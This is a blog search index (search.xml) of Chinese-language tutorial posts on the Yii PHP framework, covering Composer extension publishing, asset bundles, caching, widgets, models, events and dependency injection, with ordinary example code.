<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Yii-开发第三方]]></title>
    <url>%2F2017%2F07%2F07%2Fyii%2FYii-%E5%BC%80%E5%8F%91%E7%AC%AC%E4%B8%89%E6%96%B9%2F</url>
    <content type="text"><![CDATA[yii扩展文档 开发yii的第三方插件，放在 packagist.org 上供下载安装 创建仓库 最好还是创建仓库的时候创建 readme.md ，这样就可以直接 clone 了 开发 以 yii 的 advance 版本为例，开发富文本编辑器，富文本编辑器以 WangEidtor 为例 在 vendor 文件夹下创建 一文件夹来放置 开发的插件，正常来表示开发人或机构，比如 ibunao 进入到 ibunao 文件夹下，将 github 的仓库克隆到本地ding:ibunao echo-ding$ git clone git@ibunao.github.com:Ibunao/yii-wangEditor.git查看自己的推送权限123ding:yii-wangEditor echo-ding$ git remote -vorigin git@ibunao.github.com:Ibunao/yii-wangEditor.git (fetch)origin git@ibunao.github.com:Ibunao/yii-wangEditor.git (push) 推送的权限 下载 WangEditor ，将文件夹改成 vendor 放置在 yii-wangEditor下 WangEditor使用文档 翻墙查看 创建 composer.json 文件1234567891011121314151617181920&#123; &quot;name&quot;: &quot;ibunao/yii2-weditor&quot;, &quot;description&quot;: &quot;wangEditor for yii&quot;, &quot;type&quot;: &quot;library&quot;, &quot;keywords&quot;: [&quot;wangEditor&quot;,&quot;yiieditor&quot;,&quot;editor&quot;,&quot;weditor&quot;], &quot;homepage&quot;: &quot;https://github.com/echo-ding/yii2-wang-editor&quot;, &quot;authors&quot;: [ &#123; &quot;name&quot;: &quot;丁冉&quot;, &quot;email&quot;: &quot;275122510@qq.com&quot;, &quot;homepage&quot;: &quot;http://www.bunao.me&quot; &#125; ], &quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.2&quot; &#125;, &quot;autoload&quot;: &#123; &quot;psr-4&quot;: &#123; &quot;weditor\\&quot;: &quot;&quot; &#125; &#125;&#125; name 显示在 PHP包管理网站 上的名称，composer安装的时候也是按照这个目录名创建的 require 当前插件的依赖 autoload 自动加载 ，遵循 psr-4 规则，使用 weditor 可以直接访问到 ibunao\yii2-weditor下的文件类 创建小部件 InputWidget 类型的小部件，可以作用在表单上 创建接收上传图片的 独立动作 详细代码查看 插件源码 本地测试引入自动加载在 /vendor/composer/autoload_psr4.php 中添加 &#39;weditor\\&#39; =&gt; array($vendorDir . &#39;/ibunao/yii2-weditor&#39;), ; 亲测不行 表示用 weditor 来代替 $vendorDir . &#39;/ibunao/yii2-weditor 命名空间 在 /vendor/yiisoft/extensions.php 中添加123456789'weditor' =&gt;array ( 'name' =&gt; '', 'version' =&gt; '', 'alias' =&gt; array ( '@weditor' =&gt; $vendorDir . '/ibunao/yii-wangEditor', ),), 添加后就可以通过 weditor 命名空间来代替插件中 ibunao/yii-wangEditor ，并自动加载 也可以通过配置文件 /common/config/bootstrap.php 进行配置自动加载1Yii::setAlias('@weditor', dirname(dirname(__DIR__)) . '/vendor/ibunao/yii-wangEditor'); 这只是本地测试时这样写，上传之后通过composer安装就可以直接使用 插件的composer.json中配置的自动加载名来使用了 本地测试成功后，写使用方法 readme.md ；上传到github123git add .git commit -m &apos;test&apos;git push origin master 登陆到 PHP包管理 ,提交github项目地址检查过之后提交 此时还不能够使用composer进行安装，因为没有版本号创建版本号1234创建taggit tag v0.0.1推送到githubgit push origin --tags 在 packagist插件 点击 update 进行更新，可以看到右下边显示出了版本号，之后就可以使用composer进行安装了 composer安装了 本地项目删除自动加载，删除此插件 进入到项目的个目录执行安装命令 composer require ibunao/yii2-waneditor 安装之后即可正常的使用(自动实现了自动加载) 版本号自动更新（github和packagist之间）访问：配置获取api token github配置url格式https://packagist.org/api/bitbucket?username=用户名&amp;apiToken=xxxx 配置完成后， packagist上就不会再显示没有设置自动更新了，也可以添加tag进行测试 测试完成，delete删除发布的]]></content>
      <categories>
        <category>yii</category>
        <category>开发第三方</category>
      </categories>
      <tags>
        <tag>composer</tag>
        <tag>开发第三方</tag>
        <tag>packagist.org</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-assets]]></title>
    <url>%2F2017%2F07%2F05%2Fyii%2FYii-assets%2F</url>
    <content type="text"><![CDATA[资源包Yii在资源包中管理资源，资源包简单的说就是放在一个目录下的资源集合， 当在视图中注册一个资源包， 在渲染Web页面时会包含包中的CSS和JavaScript文件。 定义资源包资源包指定为继承 yii\web\AssetBundle 的PHP类， 包名为可自动加载的PHP类名， 在资源包类中，要指定资源所在位置， 包含哪些CSS和JavaScript文件以及和其他包的依赖关系。 如下代码定义基础应用模板使用的主要资源包：1234567891011121314151617181920&lt;?phpnamespace app\assets;use yii\web\AssetBundle;class AppAsset extends AssetBundle&#123; public $basePath = '@webroot'; public $baseUrl = '@web'; public $css = [ 'css/site.css', ]; public $js = [ ]; public $depends = [ 'yii\web\YiiAsset', 'yii\bootstrap\BootstrapAsset', ];&#125; 如上AppAsset 类指定资源文件放在 @webroot(……/web) 目录下，对应的URL为 @web，资源包中包含一个CSS文件 css/site.css，没有JavaScript文件， 依赖其他两个包 yii\web\YiiAsset 和 yii\bootstrap\BootstrapAsset yii\web\AssetBundle 的属性的详述： basePath 和 baseUrl 属性，是在引用放置在 ……/web 目录下的资源，这些资源不需要 资源管理器发布， 如果你的资源文件在一个Web可访问目录下，应设置该属性，这样就不用再发布了。如果指定了 basePath，则会直接引用源文件，不会把文件复制到 @webroot/asset 目录。 sourcePath 属性， 资源管理器 会发布包的资源到一个可Web访问并覆盖该属性(web目录下资源文件夹内生成随机的文件);光指定sourcePath，然后把js或者css放到非web目录，YII就会自动在 @webroot/asset 目录生成一个随机文件夹，然后复制js和css文件进去； depends 属性，依赖关系，即先引入 depends 里的资源，在引入 自定义的资源 jsOptions: 当调用 yii\web\View::registerJsFile()注册该包 每个 JavaScript文件时， 指定传递到该方法的选项。 cssOptions: 当调用 yii\web\View::registerCssFile()注册该包 每个 css文件时， 指定传递到该方法的选项。指定传递到该方法的选项， 仅在指定了 sourcePath 属性时使用。 后两个定义的就是注册方法的第二个参数，表示插入的位置 1234567//注册js文件时会调用\yii\web\View::registerJsFile()方法，//这个属性是用来定义registerJsFile方法的第二个参数配置，//可以填写的配置可以去看registerJsFile方法。这个属性为数组public $jsOptions = [ //定义js在页面的位置在head标签内部。 'position' =&gt; \yii\web\View::POS_HEAD,]; 资源位置资源根据它们的位置可以分为： 源资源:资源文件和PHP源代码放在一起，不能被Web直接访问， 为了使用这些源资源，它们要拷贝到一个可Web访问的Web目录中 成为发布的资源，这个过程称为发布资源。发布资源:资源文件放在可通过Web直接访问的Web目录中；外部资源:资源文件放在与你的Web应用不同的 Web服务器上； 当定义资源包类时候，如果你指定了sourcePath 属性， 就表示任何使用相对路径的资源会被当作源资源；如果没有指定该属性， 就表示这些资源为发布资源（因此应指定basePath 和 baseUrl 让Yii知道它们的位置）。 推荐将资源文件放到Web目录以避免不必要的发布资源过程， 这就是之前的例子：指定 basePath 而不是 sourcePath. 对于 扩展来说， 由于它们的资源和源代码都在不能Web访问的目录下， 在定义资源包类时必须指定sourcePath属性。 视图加载资源灵活使用AssetBundle管理CSS样式及JS脚本 控制器动作的视图（view）渲染顺序是优先于我们的模板页（layout）的，所以要保证视图中的 js、css 能够争取的使用，需要使用下面几种方法 注册代码段 巧用 数据块 在视图中定义数据块 block 12345678910111213//视图文件定义数据块 &lt;?php $this-&gt;beginBlock('block1'); ?&gt;css………………&lt;?php $this-&gt;endBlock(); ?&gt;//布局文件 &lt;head&gt; 标签内使用数据块，以达到注册css的效果 &lt;head&gt; &lt;?php if (isset($this-&gt;blocks['block1'])): ?&gt; &lt;?= $this-&gt;blocks['block1'] ?&gt;&lt;?php else: ?&gt; ... default content for block1 ...&lt;?php endif; ?&gt;&lt;/head&gt; 可以使用自带方法注册 2.1 在页面中单独写样式 12$cssString = ".gray-bg&#123;color:red;&#125;"; $this-&gt;registerCss($cssString); 2.2在页面中单独写JS(使用数据块) 12345678910&lt;div id="mybutton"&gt;点我弹出OK&lt;/div&gt; &lt;?php $this-&gt;beginBlock('test') ?&gt; $(function($) &#123; $('#mybutton').click(function() &#123; alert('OK'); &#125;); &#125;); &lt;?php $this-&gt;endBlock() ?&gt; &lt;?php $this-&gt;registerJs($this-&gt;blocks['test'], \yii\web\View::POS_END); ?&gt; 或者： 1234567891011121314151617181920&lt;?php$this-&gt;registerJs( '$("document").ready(function()&#123; $("#login-form").validate(&#123; errorElement : "small", errorClass : "error", rules: &#123; "AgNav[nav_cn]": &#123; required: true, &#125;, &#125;, messages:&#123; "AgNav[nav_cn]" : &#123; required : "此字段不能为空.", &#125;, &#125; &#125;); &#125;);');?&gt; 视图中引入CSS/JS文件 引入的文件可能需要依赖与 layout 中注册的文件，所以应该放在它们的后面 在视图 view 中引入分别有两种方法： 方法1：在 资源包管理器 AssetBundle 里面定义一个方法，然后在视图 view 中注册即可(推荐使用这种)12345678910//定义按需加载JS方法，注意加载顺序在最后 public static function addScript($view, $jsfile) &#123; $view-&gt;registerJsFile($jsfile, [AppAsset::className(), 'depends' =&gt; 'backend\assets\AppAsset']); &#125;视图中使用如下AppAsset::register($this); //只在该视图中使用非全局的jui AppAsset::addScript($this,'@web/js/jquery-ui.custom.min.js'); //AppAsset::addCss($this,'@web/css/font-awesome/css/font-awesome.min.css'); 此外注意：在上面的addScript方法中，如果没有 ’depends‘=&gt;’xxx‘ ,此处加载的顺序将会颠倒。 方法2:不需要在资源包管理器中定义方法，只要在视图页面直接引入即可 AppAsset::register($this); //css定义一样 $this-&gt;registerCssFile('@web/css/font-awesome.min.css',['depends'=&gt;['backend\assets\AppAsset']]); //$this-&gt;registerCssFile('@web/css/index-css.css'); $this-&gt;registerJsFile('@web/js/jquery-ui.custom.min.js',['depends'=&gt;['backend\assets\AppAsset']]); //$this-&gt;registerJsFile('@web/js/jquery-2.1.1.js'); //如下position是让定义CSS/JS出现的位置 //$this-&gt;registerJsFile('@web/js/jquery-ui.custom.min.js',['depends'=&gt;['backend\assets\AppAsset'],'position'=&gt;$this::POS_HEAD]);]]></content>
      <categories>
        <category>yii</category>
        <category>assets</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>assets</tag>
        <tag>视图注册资源</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-Application]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-Application%2F</url>
    <content type="text"><![CDATA[应用主体声明周期当运行 入口脚本 处理请求时， 应用主体会经历以下生命周期: 入口脚本加载应用主体配置数组。 入口脚本创建一个应用主体实例： 调用 preInit() 配置几个高级别应用主体属性， 比如yii\base\Application::basePath。 注册 yii\base\Application::errorHandler 错误处理方法. 配置应用主体属性. 调用 init() 初始化， 该函数会调用 bootstrap() 运行引导启动组件. 入口脚本调用 yii\base\Application::run() 运行应用主体: 触发 EVENT_BEFORE_REQUEST 事件。 处理请求：解析请求 路由 和相关参数； 创建路由指定的模块、控制器和动作对应的类，并运行动作。 触发 EVENT_AFTER_REQUEST 事件。 发送响应到终端用户. 入口脚本接收应用主体传来的退出状态并完成请求的处理。 应用主体是一个服务定位器 配置 应用主体 Application 的属性都可以在配置文件中进行配置 组件 components 和 bootstrap 属性配置1234567891011[ 'bootstrap' =&gt; [ // 将 log 组件 ID 加入引导让它始终载入 'log', ], 'components' =&gt; [ 'log' =&gt; [ // "log" 组件的配置 ], ],] components 就像全局属全局变量，配置的组件在使用到的时候才初始化,且只实例化一次bootstrap 每次启动的时候自动就初始化，如非每次请求都需要的组件，最好别加，造成额外的开销 默认控制器‘defaultRoute’ =&gt; ‘main’,]]></content>
      <categories>
        <category>yii</category>
        <category>应用主体</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>应用主体</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-缓存]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112/** * 行为方法 钩子函数 在请求其他方法时，会先执行这个方法 * 可以在里面配置页面缓存 * 配置后访问将会进行页面缓存 * @return [type] [description] */public function behaviors()&#123; return [ //页面缓存 [ 'class'=&gt;'yii\filters\PageCache',//页面缓存类 'duration'=&gt;1000,//缓存时间 'only'=&gt;['cache'],//缓存的页面(方法actionCache中加载的页面) 'dependency'=&gt;[//缓存依赖 'class'=&gt;'yii\caching\FileDependency', 'fileName'=&gt;'hw.txt' ] ], //http缓存，通过http请求体来告诉浏览器使用缓存情况 [ 'class'=&gt;'yii\filters\HttpCache', 'lastModified'=&gt;function()&#123;//每次请求会比对这个值来告诉浏览器是否进行过修改，是否要使用缓存，更倾向于文件修改时间是否改变 return filemtime('hw.txt'); &#125;, 'etagSeed'=&gt;function()&#123;//同样是进行比对，更倾向于文件内容是否改变，etag如果不变，lastModified变了也没用 //简单判断文件是否变化 $fp=fopen('hw.txt','r'); $title=fgets($fp);//读取第一行的数据 fclose($fp); return $title; &#125; ] ];&#125;/** * 使用缓存 * 使用缓存类型可以在配置在basic\config\web.php中进行配置 * components组件下的cache中进行配置 * @return [type] [description] */public function actionCache()&#123; //获取缓存组件 $cache = \YII::$app-&gt;cache; /*//往缓存中写数据，如果对应的key存在则不会进行写入 可以添加第三个参数，表示缓存的时间 $cache-&gt;add('key1','hello world!'); //修改数据 可以添加第三个参数，表示缓存的时间 $cache-&gt;set('key1','hello world2'); //删除数据 $cache-&gt;delete('key1'); //清空所有的数据 $cache-&gt;flush(); //读取缓存 如果读取不出来则会返回false $data = $cache-&gt;get('key1'); var_dump($data);*/ //依赖，如果依赖的……进行改变或修改时间进行改变则会导致缓存的数据进行失效 //文件依赖 /*$dependency = new \yii\caching\FileDependency(['fileName'=&gt;'hw.txt']); $cache-&gt;add('file_key','hello world!',3000,$dependency); var_dump($cache-&gt;get('file_key'));*/ //表达式的依赖 依赖于表达式的结果，如果结果发生变化，则缓存失效 //get("name")如果改变缓存失效 /*$dependency = new \yii\caching\ExpressionDependency( ['expression'=&gt;'YII::$app-&gt;request-&gt;get("name")'] ); $cache-&gt;add('expression_key','hello world!',3000,$dependency); var_dump($cache-&gt;get('expression_key'));*/ //DB依赖 依赖于查询语句的结果，如果结果发生变化则缓存失效 /*$dependency = new \yii\caching\DbDependency( ['sql'=&gt;'SELECT count(*) FROM yiitest1.order'] ); $cache-&gt;add('db_key','hello world!',3000,$dependency); var_dump($cache-&gt;get('db_key'));*/ //片段缓存 在模板页设置 //片段缓存介绍(主要负责把前端界面的一些区域[不会经常变动的区域：如京东商品分类]缓存起来[缓存到内存或文件中]，下次访问时直接从缓存里把数据拿出来，而不用再从数据库抓取信息，提高了程序的执行效率) //显示方法如下,需要使用return进行返回,参数为需要显示的视图名，不需要加后缀，文件后缀名统一为php return $this-&gt;renderPartial('cache');&#125;## cache.php&lt;?php //缓存时间 $duration=15; //缓存依赖 $dependency=[ 'class'=&gt;'yii\caching\FileDependency',//使用文件依赖 'fileName'=&gt;'hw.txt' ]; //缓存开关 $enabled=true; ?&gt; &lt;!-- $this-&gt;beginCache()会检查当前是否缓存，如果缓存了将会直接从缓存中读取 --&gt; &lt;?php if ($this-&gt;beginCache('cache_div',['duration'=&gt;$duration,'dependency'=&gt;$dependency,'enabled'=&gt;$enabled])) &#123; ?&gt;&lt;div&gt; &lt;div&gt;这里是会被缓存的abc&lt;/div&gt;&lt;/div&gt; &lt;?php $this-&gt;endCache(); &#125; ?&gt; &lt;div&gt; &lt;div&gt;这里不会被缓存&lt;/div&gt; &lt;/div&gt;]]></content>
      <categories>
        <category>yii</category>
        <category>缓存</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>http缓存</tag>
        <tag>页面缓存</tag>
        <tag>片段缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-widgets]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-widgets%2F</url>
    <content type="text"><![CDATA[可以当作是一个动作 action 加载视图 创建小部件继承 yii\base\Widget 类并覆盖 yii\base\Widget::init() 和/或 yii\base\Widget::run() 方法可创建小部件。通常 init() 方法处理小部件属性， run() 方法包含小部件生成渲染结果的代码。 渲染结果可在run()方法中直接”echoed”输出或以字符串返回。 如下代码中HelloWidget编码并显示赋给message 属性的值， 如果属性没有被赋值，默认会显示”Hello World”。12345678910111213141516171819202122namespace app\components;use yii\base\Widget;use yii\helpers\Html;class HelloWidget extends Widget&#123; public $message; public function init() &#123; parent::init(); if ($this-&gt;message === null) &#123; $this-&gt;message = 'Hello World'; &#125; &#125; public function run() &#123; return Html::encode($this-&gt;message); &#125;&#125; 使用这个小部件只需在视图中简单使用如下代码:1234&lt;?phpuse app\components\HelloWidget;?&gt;&lt;?= HelloWidget::widget(['message' =&gt; 'Good morning']) ?&gt; 以下是另一种可在begin() 和 end()调用中使用的HelloWidget， HTML编码内容然后显示。12345678910111213141516171819namespace app\components;use yii\base\Widget;use yii\helpers\Html;class HelloWidget extends Widget&#123; public function init() &#123; parent::init(); ob_start(); &#125; public function run() &#123; $content = ob_get_clean(); return Html::encode($content); &#125;&#125; 如上所示，PHP输出缓冲在 init() 启动，所有在 init() 和 run() 方法之间的输出内容都会被获取， 并在 run() 处理和返回。 注意: 当你调用 yii\base\Widget::begin() 时会创建一个 新的小部件实例 并在构造结束时调用 init() 方法， 在 end() 时会调用 run() 方法并输出返回结果。 如下代码显示如何使用这种 HelloWidget:12345678&lt;?phpuse app\components\HelloWidget;?&gt;&lt;?php HelloWidget::begin(); ?&gt; content that may contain &lt;tag&gt;'s&lt;?php HelloWidget::end(); ?&gt; 有时小部件需要渲染很多内容，一种更好的办法 是将内容放入一个视图文件， 然后调用 yii\base\Widget::render() 方法渲染该视图文件，例如：1234public function run()&#123; return $this-&gt;render('hello');&#125; 小部件的视图文件默认存储在 WidgetPath/views 目录，WidgetPath 代表小部件类文件所在的目录。 假如上述示例小部件类文件在 @app/components 下， 会渲染 @app/components/views/hello.php 视图文件。 You may override 可以覆盖 yii\base\Widget::getViewPath() 方法自定义视图文件所在路径。]]></content>
      <categories>
        <category>yii</category>
        <category>widgets</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>widgets</tag>
        <tag>小部件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-model]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-model%2F</url>
    <content type="text"><![CDATA[简单的接收数据的表单，使用继承自 Model 类的模型即可，如果是需要增删改之类的牵扯到表的则用 Active Record 活动记录(也是继承自 Model) Model 类属性1234567891011121314public function actionModel()&#123; $model = new TestForm; // 显示所有的公有属性 var_dump($model-&gt;attributes); // yii\base\Model 支持 ArrayAccess 数组访问 可以像访问数组但愿项一样访问属性 $model['name'] = 'example'; echo $model['name']; // Model 支持 ArrayIterator 数组迭代器，迭代器遍历模型，访问所有的公有属性 foreach ($model as $name =&gt; $value) &#123; echo "$name: $value\n"; &#125;&#125; 属性标签 属性标签多用在小部件展示字段的时候显示的字段名 获取属性标签$model-&gt;getAttributeLabel(‘name’); 手动设置属性标签public function attributeLabels(){ return [ ‘name’ =&gt; ‘Your name’, ];} 场景 不同的场景执行不同字段的验证，实现一个Model对应可以对应多个不同业务的表单 模型可能在多个 场景 下使用，例如 User 模块可能会在收集用户登录输入， 也可能会在用户注册时使用。在不同的场景下， 模型可能会使用不同的业务规则和逻辑， 例如 email 属性在注册时强制要求有，但在登陆时不需要。 模型使用 yii\base\Model::scenario 属性保持使用场景的跟踪， 默认情况下，模型支持一个名为 default 的场景， 如下展示两种设置场景的方法:12345// 场景作为属性来设置$model-&gt;scenario = 'login';// 场景通过构造初始化配置来设置$model = new Model(['scenario' =&gt; 'login']); 定义场景验证规则：方式一：直接在场景方法中定义12345678910111213class User extends ActiveRecord&#123; const SCENARIO_LOGIN = 'login'; const SCENARIO_REGISTER = 'register'; //定义场景 public function scenarios() &#123; return [ self::SCENARIO_LOGIN =&gt; ['username', 'password'], self::SCENARIO_REGISTER =&gt; ['username', 'email', 'password'], ]; &#125;&#125; 方式二：直接在规则 rolus() 方法中 使用 on 来指定场景，没使用 on 将用在所有场景中12345678910public function rules()&#123; return [ // 在"register" 场景下 username, email 和 password 必须有值 [['username', 'email', 'password'], 'required', 'on' =&gt; 'register'], // 在 "login" 场景下 username 和 password 必须有值 [['username', 'password'], 'required', 'on' =&gt; 'login'], ];&#125; 场景特性主要在验证 和 属性块赋值 中使用。 验证规则当模型接收到终端用户输入的数据，数据应当满足某种规则(称为 验证规则, 也称为 业务规则)。 例如假定 ContactForm 模型， 你可能想确保所有属性不为空且 email 属性包含一个有效的邮箱地址， 如果某个属性的值不满足对应的业务规则， 相应的错误信息应显示，以帮助用户修正错误。 可调用 yii\base\Model::validate() 来验证接收到的数据， 该方法使用 yii\base\Model::rules() 申明的验证规则来验证每个相关属性， 如果没有找到错误，会返回 true， 否则它会将错误保存在 yii\base\Model::errors 属性中并返回 false ，例如：1234567891011$model = new \app\models\ContactForm;// 用户输入数据赋值到模型属性$model-&gt;attributes = \Yii::$app-&gt;request-&gt;post('ContactForm');// 验证数据if ($model-&gt;validate()) &#123; // 所有输入数据都有效 all inputs are valid&#125; else &#123; // 验证失败：$errors 是一个包含错误信息的数组 $errors = $model-&gt;errors;&#125; 通过覆盖 yii\base\Model::rules() 方法指定 模型属性应该满足的规则来申明模型相关验证规则。 下述例子显示ContactForm模型申明的验证规则:12345678910public function rules()&#123; return [ // name, email, subject 和 body 属性必须有值 [['name', 'email', 'subject', 'body'], 'required'], // email 属性必须是一个有效的电子邮箱地址 ['email', 'email'], ];&#125; 一条规则可用来验证一个或多个属性，一个属性可对应一条或多条规则。 有时你想一条规则只在某个 场景 下应用， 为此你可以指定规则的 on 属性，如下所示:12345678910public function rules()&#123; return [ // 在"register" 场景下 username, email 和 password 必须有值 [['username', 'email', 'password'], 'required', 'on' =&gt; 'register'], // 在 "login" 场景下 username 和 password 必须有值 [['username', 'password'], 'required', 'on' =&gt; 'login'], ];&#125; 如果没有指定 on 属性，规则会在所有场景下应用， 在当前 yii\base\Model::scenario 下应用的规则称之为 active rule活动规则。 一个属性只会属于scenarios()中定义的活动属性且在 rules() 申明对应一条或多条活动规则的情况下被验证。 块赋值块赋值只用一行代码将用户所有输入填充到一个模型，非常方便， 它直接将输入数据对应填充到 yii\base\Model::attributes() 属性。 以下两段代码效果是相同的， 都是将终端用户输入的表单数据赋值到 ContactForm 模型的属性， 明显地前一段块赋值的代码比后一段代码简洁且不易出错。12345678$model = new \app\models\ContactForm;$model-&gt;attributes = \Yii::$app-&gt;request-&gt;post('ContactForm');$model = new \app\models\ContactForm;$data = \Yii::$app-&gt;request-&gt;post('ContactForm', []);$model-&gt;name = isset($data['name']) ? $data['name'] : null;$model-&gt;email = isset($data['email']) ? $data['email'] : null;$model-&gt;subject = isset($data['subject']) ? $data['subject'] : null;$model-&gt;body = isset($data['body']) ? $data['body'] : null; 块赋值调用的是 setAttributes() 方法，有两个参数，第二个参数默认为 true ,表示需要 rolus() 方法在声明了的字段(属性)且字段前面没有 ! 才给赋值(只是赋值，并验证)，改为 false 表示只要对应的有这个属性(字段)，就给赋值 非安全属性如上所述，yii\base\Model::scenarios() 方法提供两个用处：定义哪些属性应被验证，定义哪些属性安全。 在某些情况下，你可能想验证一个属性但不想让他是安全的， 可在scenarios()方法中属性名加一个惊叹号 !。 例如像如下的 secret 属性。123456public function scenarios()&#123; return [ 'login' =&gt; ['username', 'password', '!secret'], ];&#125; 当模型在 login 场景下，三个属性都会被验证， 但只有 username和 password 属性会被块赋值， 要对 secret属性赋值，必须像如下例子明确对它赋值。 123456789$model-&gt;secret = $secret;The same can be done in rules() method:public function rules()&#123; return [ [['username', 'password', '!secret'], 'required', 'on' =&gt; 'login'] ];&#125; 加了!的只能单独赋值才能赋值，没想到有什么情景会用到 数据导出模型通常要导出成不同格式，例如，你可能想将模型的一个集合转成JSON或Excel格式， 导出过程可分解为两个步骤，第一步，模型转换成数组；第二步，数组转换成所需要的格式。你只需要关注第一步，因为第二步可被通用的 数据转换器如yii\web\JsonResponseFormatter来完成。 将模型转换为数组最简单的方式是使用 yii\base\Model::attributes() 属性， 例如：12$post = \app\models\Post::findOne(100);$array = $post-&gt;attributes; ARrules规则]]></content>
      <categories>
        <category>yii</category>
        <category>model</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>model</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-事件机制]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[观察者模式的升级版吧，通过维护一个事件数组，来实现事件的绑定和通知的 事件机制 一个对象抛出事件，另一个对象监听到事件后执行相应的动作 实现方法： 扫描式：一个对象发生事件，存入数组，然后另一个对象不断进行扫描 绑定式 ：在一个数组中进行事件绑定，当一个事件发生时，直接触发对应的事件 yii用的绑定式 绑定事件使用 on() 方法触发事件使用 trigger() 方法基本使用方法 触发事件时带有参数数据的情况123456789101112&lt;?phpnamespace *****;use yii\base\Event;/*** event类，用来作为事件传递的参数* 需要继承Event类*/class MyEvent extends Event&#123; //定义属性，用来传递值 public $message;&#125; 类级别的绑定 触发的方法都可以改为一个匿名函数]]></content>
      <categories>
        <category>yii</category>
        <category>事件</category>
      </categories>
      <tags>
        <tag>yii事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-设计模式]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Yii深入理解 Behavior 行为是 yii\base\Behavior 或其子类的实例。 行为，也称为 mixins， 可以无须改变类继承关系即可增强一个已有的 组件component 类功能。 当行为附加到组件后，它将“注入”它的方法和属性到组件，然后可以像访问组件内定义的方法和属性一样访问它们。 此外，行为通过组件能响应被触发的事件， 从而自定义或调整组件正常执行的代码。 类混合 行为类最好定义在 behaviors 文件夹内 将行为类结合放置进其他类中，让其他类直接使用它的方法和属性,实现对类的扩展 对象混合和类的混合相似，不过绑定的是对象 依赖注入(DI)容器 用来解决依赖关系的 程序=算法+数据 算法就是方法; 数据就是方法中调用的对象;好的程序需要尽可能的进行解耦，所以需要将算法和数据进行剥离 原理就是将要用到的对象通过参数的形式传递进去 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace app\controllers;use yii\web\Controller;//使用容器use yii\di\Container;/*** 依赖注入*/class DependencyController extends Controller&#123; public function actionIndex() &#123; //需要使用容器类 $container =new Container; //set，当发现是接口无法实例化时，指定接口的要实例化的类 //实例化这个类作为参数 $container-&gt;set('app\controllers\Dirver','app\controllers\ManDirver'); //依赖注入 $car=$container-&gt;get('app\controllers\Car'); $car-&gt;run(); &#125;&#125;/*** 通过接口实现消除强依赖*/interface Dirver&#123; public function dirve();&#125;/*** 要注入的类*/class ManDirver implements Dirver&#123; public function dirve() &#123; echo "i am an old man"; &#125;&#125;/*** 要被注入的类*/class Car&#123; // 通常通过构造方法方式进行注入的 private $dirver = null; //通过接口实现消除强依赖 容器在使用get方法是会将实例化参数前面的类型 public function __construct(Dirver $dirver) &#123; $this-&gt;dirver =$dirver; &#125; public function run() &#123; $this-&gt;dirver-&gt;dirve(); &#125;&#125; 为了加深理解，以官方文档上的例子来说明DI容器解析依赖的过程。假设有以下代码:123456789101112131415161718192021222324252627282930313233343536namespace app\models;use yii\base\Object;use yii\db\Connection;// 定义接口interface UserFinderInterface&#123; function findUser();&#125;// 定义类，实现接口class UserFinder extends Object implements UserFinderInterface&#123; public $db; // 从构造函数看，这个类依赖于 Connection public function __construct(Connection $db, $config = []) &#123; $this-&gt;db = $db; parent::__construct($config); &#125; public function findUser()&#123;&#125;&#125;class UserLister extends Object&#123; public $finder; // 从构造函数看，这个类依赖于 UserFinderInterface接口 public function __construct(UserFinderInterface $finder, $config = []) &#123; $this-&gt;finder = $finder; parent::__construct($config); &#125;&#125; 从依赖关系看，这里的 UserLister 类依赖于接口 UserFinderInterface ， 而接口有一个实现就是 UserFinder 类，但这类又依赖于 Connection 。 那么，按照一般常规的作法，要实例化一个 UserLister 通常这么做:123$db = new \yii\db\Connection(['dsn' =&gt; '...']);$finder = new UserFinder($db);$lister = new UserLister($finder); 就是逆着依赖关系，从最底层的 Connection 开始实例化，接着是 UserFinder 最后是 UserLister 。 在写代码的时候，这个前后顺序是不能乱的。而且，需要用到的单元，你要自己一个一个提前准备好。 对于自己写的可能还比较清楚，对于其他团队成员写的，你还要看他的类究竟是依赖了哪些，并一一实例化。 这种情况，如果是个别的、少量的还可以接受，如果有个10－20个的，那就麻烦了。 估计光实例化的代码，就可以写满一屏幕了。 而且，如果是团队开发，有些单元应当是共用的，如邮件投递服务。 不能说你写个模块，要用到邮件服务了，就自己实例化一个邮件服务吧？那样岂不是有N模块就有N个邮件服务了？ 最好的方式是使邮件服务成为一个单例，这样任何模块在需要邮件服务时，使用的其实是同一个实例。 用传统的这种实例化对象的方法来实现的话，就没那么直接了。 那么改成 DI容器 的话，应该是怎么样呢？他是这样的:1234567891011121314151617use yii\di\Container;// 创建一个DI容器$container = new Container;// 为Connection指定一个数组作为依赖，当需要Connection的实例时，使用这个数组进行创建$container-&gt;set('yii\db\Connection', ['dsn' =&gt; '...',]);// 在需要使用接口 UserFinderInterface 时，采用UserFinder类实现$container-&gt;set('app\models\UserFinderInterface', [ 'class' =&gt; 'app\models\UserFinder',]);// 为UserLister定义一个别名$container-&gt;set('userLister', 